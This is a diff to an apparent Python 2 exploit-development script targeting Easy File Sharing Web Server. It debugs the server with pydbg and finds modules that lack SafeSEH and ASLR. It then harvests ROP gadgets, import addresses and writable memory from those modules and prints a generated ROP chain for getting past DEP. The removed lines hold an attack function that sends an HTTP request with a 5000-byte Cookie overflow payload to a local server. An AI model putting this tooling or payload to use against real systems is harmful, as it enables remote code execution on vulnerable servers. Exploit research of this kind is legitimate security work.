@@ -1,10 +1,83 @@
-from pydbg import *
-import threading
-import sys
-import time
-import socket
+from PE import *
+from util import *
+from Gadget import *
+import struct
 
-import pefile
+import sys
+import platform
+import os
+
+from pydbg import *
+from pydbg.defines import *
+
+import cPickle
+import random
+
+PICKLE_GADGET = "fsws.pkl"
+
+exe_path = "D:\\testPoc\\Easy File Sharing Web Server\\fsws.exe"
+
+import threading
+import time
+
+win7After = True if platform.release() in ["6", "7", "8", "vista", "win7", "2008server", "win8", "win8.1", "win10"] else False
+
+# Get module list without system module.
+def getModuleList(dbg, exe_path):
+	system_dlls = dbg.system_dlls
+	file_prefix = "\\".join(exe_path.split("\\")[1:-1])
+	disk = exe_path[0:2]
+	ModulesList = [exe_path]
+
+	for dll in system_dlls:
+		if file_prefix in dll.path:
+			ModulesList.append(disk + dll.path)
+
+	return ModulesList
+
+# Get gadget by no protect module, IAT and wriatable address.
+def getRopGadgetAndIATAndWriteAddress(dbg, ModulesList):
+	# Get all usable gadgets.
+	collect_gadgets = {}
+	IAT = {}
+	wriatableAddress = {}
+
+	for module in ModulesList:
+		pe = PE(module)
+		image_top = pe.Base + pe.BaseSize
+		if pe.Base>0:
+			peOffset = struct.unpack("<L", dbg.read(pe.Base+0x3c, 4))[0]
+			base = pe.Base + peOffset
+			safeseh_offset = [0x5f, 0x5f, 0x5e]
+			safeseh_flag = [0x4, 0x4, 0x400]
+			os_index = 2 if win7After else 0
+			module_flag = struct.unpack("<H", dbg.read(base+safeseh_offset[os_index], 2))[0]
+			# check safeSEH
+			safeSEH = True if module_flag & safeseh_flag[os_index] else False
+			# check ASLR
+			ASLR = True if module_flag & 0x0040 else False
+			# check NX
+			NX = True if module_flag & 0x0100 else False
+		
+		if (not safeSEH) and (not ASLR):
+			module_name = module.lower()
+			Rebase = True
+			for mod in dbg.enumerate_modules():
+				if module_name.endswith(mod[0].lower()) and mod[1] == pe.Base:
+					Rebase = False
+					break
+			if not Rebase:
+				print "[+] Module %s add." % module
+				module_gadget = Gadget(pe)
+				classify_gadget(module_gadget.retGadgets, module_gadget.jmpGadgets, collect_gadgets)
+				IAT.update( { module : pe.IAT } )
+				for section in pe.DataSections:
+					for test in xrange(5):
+						vaddr = section["vaddr"] + random.randint(0,section["size"])
+						if gadget_filter(vaddr):
+							wriatableAddress.update( { vaddr : module } )
+							break
+	return collect_gadgets, IAT, wriatableAddress
 
 class Fuzzer(object):
 	def __init__(self, exe_path):
@@ -12,6 +85,8 @@ class Fuzzer(object):
 		self.pid = None
 		self.dbg = None
 		self.running = True
+		self.pe = PE(exe_path)
+		self.gadgets = Gadget(self.pe)
 		
 		self.dbgThread = threading.Thread(target=self.start_debugger)
 		self.dbgThread.setDaemon(False)
@@ -20,74 +95,49 @@ class Fuzzer(object):
 		# Wait debugger start process
 		while self.pid is None:
 			time.sleep(1)
-			
+		
 		self.monitorThread = threading.Thread(target=self.monitor_debugger)
 		self.monitorThread.setDaemon(False)
 		self.monitorThread.start()
 			
 	def monitor_debugger(self):
-		while self.running:
-			# isContinue = raw_input("[+] y/n")
-			attack()
-			system_dlls = self.dbg.system_dlls
-			file_prefix = "\\".join(self.exe_path.split("\\")[1:-1])
-			disk = self.exe_path[0:2]
-			# print file_prefix
-			self.ropModulesList = []
-			
-			step = 1
-			print "[+] Step%d fetch execute file path prefix." % (step)
-			print "[*] file pre_fix %s" % (file_prefix)
-			print
-			step += 1
-			
+		while self.running:		
+			self.ModulesList = getModuleList(self.dbg, self.exe_path)
 			'''
-				show all dll.
+			for l in self.ModulesList:
+				print l
 			'''
-			'''
-			print "system dll"
-			for dll in system_dlls:
-				print dll.path
-			print
+			print "[+] Get no protect modules."
+			global PICKLE_GADGET
+			PICKLE_GADGET = self.exe_path.split("\\")[-1].replace(".exe", ".pkl")
+
+			# if first analysis.
+			if not os.path.isfile(PICKLE_GADGET):
+				with open(PICKLE_GADGET, "wb") as local_file:
+					collect_gadgets, IAT, wriatableAddress = getRopGadgetAndIATAndWriteAddress(self.dbg, self.ModulesList)
+					cPickle.dump(collect_gadgets, local_file)
+					cPickle.dump(IAT, local_file)
+					cPickle.dump(wriatableAddress, local_file)
 			
-			for modules in self.dbg.enumerate_modules():
-				print modules[0]
-			print
-			'''
+			else:
+				with open(PICKLE_GADGET, "rb") as local_file:
+					collect_gadgets = cPickle.load(local_file)
+					IAT = cPickle.load(local_file)
+					wriatableAddress = cPickle.load(local_file)
 			
-			'''
-				collect all modules that don't belongs system.
-			'''
-			print "[+] Step%d append dll with file_prefix" % (step)
-			for dll in system_dlls:
-				if file_prefix in dll.path:
-					print "[*] Append %s"  % (disk + dll.path)
-					self.ropModulesList.append(disk + dll.path)
-			print
-			step += 1
+
+			print "[+] Get Rop Gadget."
 			
-			print "[+] Step%d append with not in system dll" % (step)
-			for module in self.dbg.enumerate_modules():
-				if ".exe" in module[0]:
-					print "[*] Append %s" % (disk + "\\" + file_prefix + "\\" + module[0])
-					self.ropModulesList.append(disk + "\\" + file_prefix + "\\" + module[0])
+			# cPickle.dump()
+			rop_chain = generate_ropchain(collect_gadgets, IAT, wriatableAddress)
 			print
-			step += 1
-			
-			print "[+] Step%d check Rop modules can be used" % (step)
-			for module in self.ropModulesList:
-				try:
-					f = open(module, "rb")
-					f.close()
-					print "[*] Open", module, "success."
-				except Exception as e:
-					print "[*] Open", module ,"fail."
-					print "[*] Remove module %s" % (module)
-					# print str(e)
+			print "[+] ROP Chain"
+			print "ropchain = [ "
+			for a,b in rop_chain:
+				print '   ',hex(a), ", #", b
+			print "]"
 			print
-			step += 1
-			
-			# stop debugger running
+
 			self.running = False
 			
 		# close debugger
@@ -111,25 +161,5 @@ class Fuzzer(object):
 		
 		self.dbg.run()
 		
-		
-def attack():
-	time.sleep(5)
-	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	host, port = "127.0.0.1", 80
-	s.connect((host, port))
-	payload = "A" * 5000
-	http_req = ( "User-Agent: Mozilla/4.0\r\n"
-                 "Host:" + host + ":" + str(port) + "\r\n"
-                 "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
-                 "Accept-Language: en-us\r\n"
-                 "Accept-Encoding: gzip, deflate\r\n"
-                 "Referer: http://" + host + "/\r\n"
-                 "Cookie: SESSIONID=6771; UserID=;" + payload + " "
-                 "PassWD=;\r\n"
-                 "Conection: Keep-Alive\r\n\r\n"
-                 )
-	s.send(http_req)
-	s.close()
-		
 exe_path = "D:\\testPoc\\Easy File Sharing Web Server\\fsws.exe"
-fuzzer = Fuzzer(exe_path)
+Fuzzer(exe_path)
